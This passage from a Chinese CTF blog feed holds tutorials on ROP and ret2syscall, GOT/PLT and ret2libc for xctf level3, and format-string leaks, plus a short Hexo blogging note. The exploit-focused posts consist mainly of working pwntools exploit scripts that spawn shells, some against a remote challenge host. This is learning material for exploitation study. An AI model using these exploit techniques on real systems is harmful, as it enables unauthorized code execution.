10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。</p><pre class=" language-bash"><code class="language-bash">ROPgadget --binary rop  --only <span class="token string">'pop|ret'</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'eax'</span>  //搜寻pop eax 和retROPgadget --binary rop  --only <span class="token string">'pop|ret'</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'ebx'</span>  //搜寻pop ebx 和retROPgadget --binary rop  --string <span class="token string">'/bin/sh'</span>   //还可以找字符串，那当然也可以找system函数如果有的话ROPgadget --binary rop  --only <span class="token string">'int'</span>   //这个主要找 int 80h这个指令</code></pre><p>找到完地址后：<br><img src="https://s1.ax1x.com/2020/06/01/t3TzcV.png" alt=""><br>根据以上思路把payload像上面这样构造就好了<br>实战：ret2syscall这个例子<br>32位程序<br><img src="https://s1.ax1x.com/2020/06/01/t3TXhn.png" alt=""><br>IDA：</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+1Ch] [bp-64h]@1</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"This time, no system() and NO SHELLCODE!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What do you plan to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>溢出点就没搞步骤了：112个字符，既然没有system还开启了NX    那就用rop吧<br>因为没有system函数，那么我们就得构造execve的ROP链：<br>找pop eax ；ret 指令<br><img src="https://s1.ax1x.com/2020/06/01/t3Tvpq.png" alt=""><br>我们选第二个</p><p>找pop ebx；ret指令<br><img src="https://s1.ax1x.com/2020/06/01/t37CBF.png" alt=""><br>这里我们选倒数第5个：</p><pre class=" language-bash"><code class="language-bash">0x0806eb90 <span class="token keyword">:</span> pop edx <span class="token punctuation">;</span> pop ecx <span class="token punctuation">;</span> pop ebx <span class="token punctuation">;</span> ret //这个直接把另外两个包括了，我们构造的时候注意参数位置即可</code></pre><p>找int 80h指令<br><img src="https://s1.ax1x.com/2020/06/01/t379nU.png" alt=""></p><p>还有/bin/sh字符串<br><img src="https://s1.ax1x.com/2020/06/01/t37SXT.png" alt=""></p><p>万事具备！！<br>构造exp：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token comment" spellcheck="true">#0x080bb196 : pop eax ; ret</span>pop_eax_ret <span class="token operator">=</span> <span class="token number">0x080bb196</span><span class="token comment" spellcheck="true">#0x080be408 : /bin/sh</span>binsh_addr <span class="token operator">=</span> <span class="token number">0x080be408</span><span class="token comment" spellcheck="true">#0x08049421 : int 0x80</span><span class="token comment" spellcheck="true">#0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span>pop_edx_pop_ecx_pop_ebx_ret <span class="token operator">=</span> <span class="token number">0x0806eb90</span>payload <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">112</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_eax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xb</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_edx_pop_ecx_pop_ebx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>  <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x08049421</span><span class="token punctuation">)</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"ret2syscall"</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://s1.ax1x.com/2020/06/01/t3Tx10.png" alt=""></p><p>（系统调用功能好可以参考System Call Number Definition<br>以及<a href="http://asm.sourceforge.net/syscall.html#2" target="_blank" rel="noopener">http://asm.sourceforge.net/syscall.html#2</a><br>或者 <a href="http://syscalls.kernelgrok.com/" target="_blank" rel="noopener">http://syscalls.kernelgrok.com/</a> 查找(推荐!)</p><p>启发：<a href="https://zhuanlan.zhihu.com/p/72951960（详细）" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/72951960（详细）</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BLOG</title>
      <link href="/2020/05/23/mass/"/>
      <url>/2020/05/23/mass/</url>
      
        <content type="html"><![CDATA[<pre><code>             hexo基本写文章操作：</code></pre><p>1：在自己本地blog文件夹git bash here<br><img src="https://s1.ax1x.com/2020/05/23/YjltX9.png" alt=""></p><p>2:在bash中：hexo n “name” 或是直接在_posts中写文章</p><p>3：文章中插入图片<br>    语法：</p><p>![图片alt](图片地址 ‘’图片title’’)</p><p>图片alt就是显示在图片下面的文字，相当于对图片内容的解释。<br>图片title是图片的标题，当鼠标移到图片上时显示的内容。title可加可不加</p><p>4：图床：<a href="https://imgchr.com/matri_x" target="_blank" rel="noopener">https://imgchr.com/matri_x</a></p><p>5：hexo g //生成静态网页，用于测试<br>    hexo s  //打开本地服务器，结合用于测试<br>    hexo d  //上传到github发布</p>]]></content>
      
      
      <categories>
          
          <category> MASS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BLOG </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅析got，plt，libc</title>
      <link href="/2020/05/23/qian-xi-got-plt-libc/"/>
      <url>/2020/05/23/qian-xi-got-plt-libc/</url>
      
        <content type="html"><![CDATA[<p>见详解：<a href="https://blog.csdn.net/weixin_41185953/article/details/104224260" target="_blank" rel="noopener">https://blog.csdn.net/weixin_41185953/article/details/104224260</a></p><p>在引用一个函数时（如call printf）先会条到该函数的plt表：@plt。然后plt表上存有对应该函数的got表地址，跳到got表上。这个表上面存放被引用函数的真实地址。<br>为了程序运行时的效率，还没有引用某个函数时程序不会连接启用包括此函数这样就使程序运行速度更快。</p><p><img src="https://s1.ax1x.com/2020/05/23/Yj19c4.png" alt="picture1"></p><p>libc文件里面包含大量函数包括system，read，write还有字符串/bin/sh ，libc在被程序引用时会分配到一个地址也就是libc的首地址，然后里面的函数或被程序引用。</p><p>引用过程：<br>首先libc分配到一个地址，他里面的函数字符串什么的本来就有内部基于libc首地址的偏移量，这些偏移量都是可以用ELF指令解析libc文件再用搜寻指令查到。所以一旦libc被引用分配得首地址libc里面所包括的所有函数和字符串地址就都确定了。call函数时用上述的plt，got表跳转寻址，最后通过重定位got表得到真实函数地址。</p><p>对应题目：xctf pwn level3<br>1:file</p><p><img src="https://s1.ax1x.com/2020/05/23/Yj1m9O.png" alt="picture2"></p><p>2:checksec</p><p><img src="https://s1.ax1x.com/2020/05/23/Yj1VN6.png" alt="picture3"></p><p>可以栈溢出，NX开启：rop绕过</p><p>3：ida</p><p><img src="https://s1.ax1x.com/2020/05/23/Yj1kH1.png" alt="picture4"></p><p><img src="https://s1.ax1x.com/2020/05/23/Yj1EAx.png" alt="picture5"></p><p>查看buf的栈空间发现可以溢出：溢出量140</p><p>所以现在的思路就是：payload = “A”*140 + p32(system_addr) + p32(0) + p32(binsh_addr)<br>所以得有哦system函数和binsh字符串   注意此处system函数的构建：函数地址+返回地址+函数参数  很多情况都是在栈中这样构建函数</p><p>4：ida查看函数与字符串</p><p><img src="https://s1.ax1x.com/2020/05/23/Yj1FBR.png" alt="picture6"></p><p>显然这个程序只调用了read和write函数，没有system和binsh。恰好libc里面这两个都有所以要想办法得到libc的基地址。</p><p>这里write函数有三个参数：1，字符串（地址），显示的字节数</p><p>如果我们溢出了read函数后跳到我们自己构建的write函数上，把中间的参数改为write的got地址那么显示出got表上存放write函数的真实<br>地址（plt存储got表地址，got表存放函数地址）。<br>如果我们得到了write函数的真实地址，然后可以轻松得到write函数在libc中的偏移量，最后算出libc的基地址：libc_addr = write_addr - write_offset<br>得到了libc的基地址那么我们就可以得到system和binsh的真实地址，然后再进行一次溢出攻击即可</p><p>exp：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"124.126.19.106"</span><span class="token punctuation">,</span><span class="token number">52825</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sh = process("level3")</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"level3"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"libc_32.so.6"</span><span class="token punctuation">)</span>write_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#write函数的plt地址</span>write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">#write函数的got地址，该地址存放write真实地址</span>main_addr <span class="token operator">=</span> <span class="token number">0x08048484</span> <span class="token comment" spellcheck="true">#main函数地址可以从ida直接看，也可以elf.symbols['main']搜索</span><span class="token comment" spellcheck="true">#print write_plt     </span><span class="token comment" spellcheck="true">#print write_got</span><span class="token comment" spellcheck="true">#print main_addr</span>payload <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">140</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#第一次攻击溢出后返回到write函数的plt地址，因为write函数早已调用可以用plt地址或got地址来再次调用。后面时返回地址，返回到主函数将再次执行vulnerable函数以备下一次攻击。p32（1）为write函数的第一个参数，接下来分别是第二个第三个参数。p32（write_got）将go地址发给write作为参数，write将读取该地址上的内容并以字符串输出，p32(4)输出4字节</span><span class="token comment" spellcheck="true">#p.recv()</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>write_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#sh.recv(4)是接受4个字节的输出，u32和p32功能相反</span><span class="token comment" spellcheck="true">#print write_addr</span>libc_addr <span class="token operator">=</span> write_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#减去了write的offset</span><span class="token comment" spellcheck="true">#print(hex(libc_addr))</span><span class="token comment" spellcheck="true">#print "libc"+hex(libc_addr)</span>binsh_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#得到binsh真实地址</span><span class="token comment" spellcheck="true">#print "binsh_addr => "+hex(binsh_addr)</span>sys_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">#得到system真实地址</span><span class="token keyword">print</span> <span class="token string">"sys_addr => "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">140</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#通过上次攻击返回地址位vulnerable函数可以再次攻击</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>注意在本地测试脚本时要找到本地level3引用的libc文件：指令ldd level3</p><p><img src="https://s1.ax1x.com/2020/05/23/Yj1Z4K.png" alt="picture7"></p><p>因为本地的libc文件和题目给的有点不一样，至少offset是不一样的。</p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Format String Exploit</title>
      <link href="/2020/05/22/formal/"/>
      <url>/2020/05/22/formal/</url>
      
        <content type="html"><![CDATA[<pre><code>                   格式化字符串漏洞原理</code></pre><p>格式化字符串函数是根据格式化字符串函数来进行解析的。那么相应的要被解析的参数的个数也自然是由这个格式化字符串所控制。比如说’%s’表明我们会输出一个字符串参数。</p><p><img src="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/figure/printf.png" alt="函数"></p><p>对于这样的例子，在进入 printf 函数的之前 (即还没有调用 printf)，栈上的布局由高地址到低地址依次如下<br>some value   //未知量<br> 3.14 123456<br> addr of “red”<br> addr of format string: Color %s…</p><p>在进入 printf 之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况<br>当前字符不是 %，直接输出到相应标准输出。<br>当前字符是 %， 继续读取下一个字符<br>如果没有字符，报错<br>如果下一个字符是 %, 输出 %<br>否则根据相应的字符，获取相应的参数，对其进行解析并输出</p><p>假设编写如下程序:<br>printf(“Color %s, Number %d, Float %4.2f”);<br>程序照样会运行，会将栈上存储格式化字符串地址上面的三个变量分别解析为<br>1.解析其地址对应的字符串<br>2.解析其内容对应的整形值<br>3.解析其内容对应的浮点值</p><p>#以上来源于<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr</a></p><p>漏洞利用</p><p>1：程序崩溃<br>因为栈上会有很多权限不足的地址无法进行访问，利用无法访问地址使程序崩溃<br>一般输入多个%s即可<br>2：泄露内存<br>获取某个变量的值，或是某个变量对应的地址<br>例：<br>程序如下：</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">0x22222222</span><span class="token punctuation">,</span> c <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%08x.%08x.%08x.%s\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>简单编译并将防护关闭：gcc -m32 -fno-stack-protector -no-pie -o test test.c<br>（32位，关闭栈溢出防护，PIE）<br>根据 C 语言的调用规则，格式化字符串函数会根据格式化字符串直接使用栈上自顶向上的变量作为其参数 (64 位会根据其传参的规则进行获取)。这里我们主要介绍 32 位。</p><p>获取栈变量数值：</p><pre class=" language-bash"><code class="language-bash">%08x.%08x.%08x00000001.22222222.ffffffff.%08x.%08x.%08xff9645f0.f7ee9410.0804849d</code></pre><p>以上可以看出我们确实得到了3个16进制的数据。我们用gdb继续深入</p><p>首先再printf下断点：<br>gdb-peda$ b printf<br>Breakpoint 1 at 0x8048330<br>继续运行：</p><pre class=" language-bash"><code class="language-bash">gdb-peda$ rStarting program: /home/hunter/PWN/formal/wiki/test1 %08x.%08x.%08x  //我们还是输入%08x.%08x.%08x回车继续运行，程序停在第一次调用printf处：<span class="token operator">=</span><span class="token operator">></span> 0xf7e2db60 <span class="token operator">&lt;</span>printf<span class="token operator">></span>:        call   0xf7f11c79   0xf7e2db65 <span class="token operator">&lt;</span>printf+5<span class="token operator">></span>:        add    eax,0x18449b   0xf7e2db6a <span class="token operator">&lt;</span>printf+10<span class="token operator">></span>:        sub    esp,0xc   0xf7e2db6d <span class="token operator">&lt;</span>printf+13<span class="token operator">></span>:        mov    eax,DWORD PTR <span class="token punctuation">[</span>eax-0x7c<span class="token punctuation">]</span>   0xf7e2db73 <span class="token operator">&lt;</span>printf+19<span class="token operator">></span>:        lea    edx,<span class="token punctuation">[</span>esp+0x14<span class="token punctuation">]</span>No argument<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0xffffcfac --<span class="token operator">></span> 0x80484ea <span class="token punctuation">(</span><span class="token operator">&lt;</span>main+100<span class="token operator">></span>:    <span class="token punctuation">)</span>   //printf函数的返回地址0004<span class="token operator">|</span> 0xffffcfb0 --<span class="token operator">></span> 0x8048593 <span class="token punctuation">(</span><span class="token string">"%08x.%08x.%08x.%s\n"</span><span class="token punctuation">)</span> printf函数第一个参数即格式化字符串0008<span class="token operator">|</span> 0xffffcfb4 --<span class="token operator">></span> 0x1   //变量a的地址 （格式化字符串的第一个参数）0012<span class="token operator">|</span> 0xffffcfb8 <span class="token punctuation">(</span><span class="token string">"\"\"\"\"\377\377\377\377\320\317\377\377\320\317\377\377\020\364\374\367\235\204\004\b%08x.%08x.%08x"</span><span class="token punctuation">)</span>    //变量b，我不知道为啥是这么一大串，理论上是0x222222220016<span class="token operator">|</span> 0xffffcfbc --<span class="token operator">></span> 0xffffffff  //变量c0020<span class="token operator">|</span> 0xffffcfc0 --<span class="token operator">></span> 0xffffcfd0 <span class="token punctuation">(</span><span class="token string">"%08x.%08x.%08x"</span><span class="token punctuation">)</span>  该变量是我们输入的格式化字符串对应的地址 0024<span class="token operator">|</span> 0xffffcfc4 --<span class="token operator">></span> 0xffffcfd0 <span class="token punctuation">(</span><span class="token string">"%08x.%08x.%08x"</span><span class="token punctuation">)</span>0028<span class="token operator">|</span> 0xffffcfc8 --<span class="token operator">></span> 0xf7fcf410 --<span class="token operator">></span> 0x8048278 <span class="token punctuation">(</span><span class="token string">"GLIBC_2.0"</span><span class="token punctuation">)</span><span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, valueBreakpoint 1, 0xf7e2db60 <span class="token keyword">in</span> <span class="token function">printf</span>    <span class="token punctuation">(</span><span class="token punctuation">)</span> from /lib32/libc.so.6gdb-peda$ 继续执行：gdb-peda$ cContinuing.00000001.22222222.ffffffff.%08x.%08x.%08x程序确实输出了每一个变量对应的数值，并停在第二个printf<span class="token operator">=</span><span class="token operator">></span> 0xf7e2db60 <span class="token operator">&lt;</span>printf<span class="token operator">></span>:    call   0xf7f11c79   0xf7e2db65 <span class="token operator">&lt;</span>printf+5<span class="token operator">></span>:        add    eax,0x18449b   0xf7e2db6a <span class="token operator">&lt;</span>printf+10<span class="token operator">></span>:    sub    esp,0xc   0xf7e2db6d <span class="token operator">&lt;</span>printf+13<span class="token operator">></span>:        mov    eax,DWORD PTR <span class="token punctuation">[</span>eax-0x7c<span class="token punctuation">]</span>   0xf7e2db73 <span class="token operator">&lt;</span>printf+19<span class="token operator">></span>:        lea    edx,<span class="token punctuation">[</span>esp+0x14<span class="token punctuation">]</span>No argument<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0xffffcfbc --<span class="token operator">></span> 0x80484f9 <span class="token punctuation">(</span><span class="token operator">&lt;</span>main+115<span class="token operator">></span>:    add    esp,0x10<span class="token punctuation">)</span>0004<span class="token operator">|</span> 0xffffcfc0 --<span class="token operator">></span> 0xffffcfd0 <span class="token punctuation">(</span><span class="token string">"%08x.%08x.%08x"</span><span class="token punctuation">)</span>0008<span class="token operator">|</span> 0xffffcfc4 --<span class="token operator">></span> 0xffffcfd0 <span class="token punctuation">(</span><span class="token string">"%08x.%08x.%08x"</span><span class="token punctuation">)</span>0012<span class="token operator">|</span> 0xffffcfc8 --<span class="token operator">></span> 0xf7fcf410 --<span class="token operator">></span> 0x8048278 <span class="token punctuation">(</span><span class="token string">"GLIBC_2.0"</span><span class="token punctuation">)</span>0016<span class="token operator">|</span> 0xffffcfcc --<span class="token operator">></span> 0x804849d <span class="token punctuation">(</span><span class="token operator">&lt;</span>main+23<span class="token operator">></span>:    add    ebx,0x1b63<span class="token punctuation">)</span>0020<span class="token operator">|</span> 0xffffcfd0 <span class="token punctuation">(</span><span class="token string">"%08x.%08x.%08x"</span><span class="token punctuation">)</span>0024<span class="token operator">|</span> 0xffffcfd4 <span class="token punctuation">(</span><span class="token string">".%08x.%08x"</span><span class="token punctuation">)</span>0028<span class="token operator">|</span> 0xffffcfd8 <span class="token punctuation">(</span><span class="token string">"x.%08x"</span><span class="token punctuation">)</span><span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, valueBreakpoint 1, 0xf7e2db60 <span class="token keyword">in</span> <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>   from /lib32/libc.so.6gdb-peda$ </code></pre><p>此时，由于格式化字符串为 %x%x%x，所以，程序 会将栈上的 0xffffcd04 及其之后的数值分别作为第一，第二，第三个参数按照 int 型进行解析，分别输出：</p><pre class=" language-bash"><code class="language-bash">gdb-peda$ cContinuing.ffffcfd0.f7fcf410.0804849d<span class="token punctuation">[</span>Inferior 1 <span class="token punctuation">(</span>process 9574<span class="token punctuation">)</span> exited normally<span class="token punctuation">]</span></code></pre><p>想获取栈变量数值，我们一般用%p代替%08x。</p><p>这里需要注意的是，并不是每次得到的结果都一样 ，因为栈上的数据会因为每次分配的内存页不同而有所不同，这是因为栈是不对内存页做初始化的。</p><p>可以用%n$x来对应栈中第n+1个参数，因为对于printf函数格式化字符串就是栈中第一个参数，而格式化字符串后面的数据就是该格式化字符串内将被替换的参数</p><p>gdb再次深入：</p><pre class=" language-bash"><code class="language-bash">Starting program: /home/hunter/PWN/formal/wiki/test1 %3<span class="token variable">$x</span><span class="token punctuation">[</span>----------------------------------registers-----------------------------------<span class="token punctuation">]</span>EAX: 0x8048593 <span class="token punctuation">(</span><span class="token string">"%08x.%08x.%08x.%s\n"</span><span class="token punctuation">)</span>EBX: 0x804a000 --<span class="token operator">></span> 0x8049f14 --<span class="token operator">></span> 0x1 ECX: 0x1 EDX: 0xf7fb389c --<span class="token operator">></span> 0x0 ESI: 0xf7fb2000 --<span class="token operator">></span> 0x1d4d6c EDI: 0x0 EBP: 0xffffd048 --<span class="token operator">></span> 0x0 ESP: 0xffffcfac --<span class="token operator">></span> 0x80484ea <span class="token punctuation">(</span><span class="token operator">&lt;</span>main+100<span class="token operator">></span>:    add    esp,0x20<span class="token punctuation">)</span>EIP: 0xf7e2db60 <span class="token punctuation">(</span><span class="token operator">&lt;</span>printf<span class="token operator">></span>:    call   0xf7f11c79<span class="token punctuation">)</span>EFLAGS: 0x296 <span class="token punctuation">(</span>carry PARITY ADJUST zero SIGN <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>   0xf7e2db5b <span class="token operator">&lt;</span>fprintf+27<span class="token operator">></span>:    ret       0xf7e2db5c:    xchg   ax,ax   0xf7e2db5e:    xchg   ax,ax<span class="token operator">=</span><span class="token operator">></span> 0xf7e2db60 <span class="token operator">&lt;</span>printf<span class="token operator">></span>:    call   0xf7f11c79   0xf7e2db65 <span class="token operator">&lt;</span>printf+5<span class="token operator">></span>:        add    eax,0x18449b   0xf7e2db6a <span class="token operator">&lt;</span>printf+10<span class="token operator">></span>:    sub    esp,0xc   0xf7e2db6d <span class="token operator">&lt;</span>printf+13<span class="token operator">></span>:        mov    eax,DWORD PTR <span class="token punctuation">[</span>eax-0x7c<span class="token punctuation">]</span>   0xf7e2db73 <span class="token operator">&lt;</span>printf+19<span class="token operator">></span>:        lea    edx,<span class="token punctuation">[</span>esp+0x14<span class="token punctuation">]</span>No argument<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0xffffcfac --<span class="token operator">></span> 0x80484ea <span class="token punctuation">(</span><span class="token operator">&lt;</span>main+100<span class="token operator">></span>:    add    esp,0x20<span class="token punctuation">)</span>0004<span class="token operator">|</span> 0xffffcfb0 --<span class="token operator">></span> 0x8048593 <span class="token punctuation">(</span><span class="token string">"%08x.%08x.%08x.%s\n"</span><span class="token punctuation">)</span> //函数参数10008<span class="token operator">|</span> 0xffffcfb4 --<span class="token operator">></span> 0x1    //函数参数20012<span class="token operator">|</span> 0xffffcfb8 <span class="token punctuation">(</span><span class="token string">"\"\"\"\"\377\377\377\377\320\317\377\377\320\317\377\377\020\364\374\367\235\204\004\b%3<span class="token variable">$x</span>"</span><span class="token punctuation">)</span>    //函数参数30016<span class="token operator">|</span> 0xffffcfbc --<span class="token operator">></span> 0xffffffff  //函数参数4.。。。。0020<span class="token operator">|</span> 0xffffcfc0 --<span class="token operator">></span> 0xffffcfd0 <span class="token punctuation">(</span><span class="token string">"%3<span class="token variable">$x</span>"</span><span class="token punctuation">)</span>0024<span class="token operator">|</span> 0xffffcfc4 --<span class="token operator">></span> 0xffffcfd0 <span class="token punctuation">(</span><span class="token string">"%3<span class="token variable">$x</span>"</span><span class="token punctuation">)</span>0028<span class="token operator">|</span> 0xffffcfc8 --<span class="token operator">></span> 0xf7fcf410 --<span class="token operator">></span> 0x8048278 <span class="token punctuation">(</span><span class="token string">"GLIBC_2.0"</span><span class="token punctuation">)</span><span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, valueBreakpoint 1, 0xf7e2db60 <span class="token keyword">in</span> <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>   from /lib32/libc.so.6gdb-peda$ 继续：0xf7e2db60 <span class="token operator">&lt;</span>printf<span class="token operator">></span>:    call   0xf7f11c79   0xf7e2db65 <span class="token operator">&lt;</span>printf+5<span class="token operator">></span>:        add    eax,0x18449b   0xf7e2db6a <span class="token operator">&lt;</span>printf+10<span class="token operator">></span>:    sub    esp,0xc   0xf7e2db6d <span class="token operator">&lt;</span>printf+13<span class="token operator">></span>:        mov    eax,DWORD PTR <span class="token punctuation">[</span>eax-0x7c<span class="token punctuation">]</span>   0xf7e2db73 <span class="token operator">&lt;</span>printf+19<span class="token operator">></span>:        lea    edx,<span class="token punctuation">[</span>esp+0x14<span class="token punctuation">]</span>No argument<span class="token 